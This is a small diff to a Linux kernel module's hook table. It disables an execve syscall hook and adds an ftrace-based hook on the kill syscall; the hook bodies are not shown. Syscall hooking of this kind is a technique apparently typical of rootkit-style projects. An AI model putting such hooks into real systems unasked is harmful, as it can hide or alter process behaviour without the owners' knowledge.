@@ -1,5 +1,6 @@
 #include "execve.h"
 #include "hook.h"
+#include "kill.h"
 #include "mkdir.h"
 
 #include <linux/init.h>
@@ -17,7 +18,9 @@ MODULE_LICENSE("GPL");
 struct hook hooks[] = {
     // TODO The mkdir syscall impl. either inherently uses recursion or otherwise has some unique aspect that causes infinite ftrace-based recursion
     //{ .name = "__x64_sys_mkdir", .func = mkdir_hook, .orig_ptr = (void **)&mkdir_orig },
-    { .name = "__x64_sys_execve", .func = execve_hook, .orig_ptr = (void **)&execve_orig },
+    //{ .name = "__x64_sys_execve", .func = execve_hook, .orig_ptr = (void **)&execve_orig },
+    
+    { .name = "__x64_sys_kill", .func = kill_hook, .orig_ptr = (void **)&kill_orig },
 };
 
 static int __init init(void) {
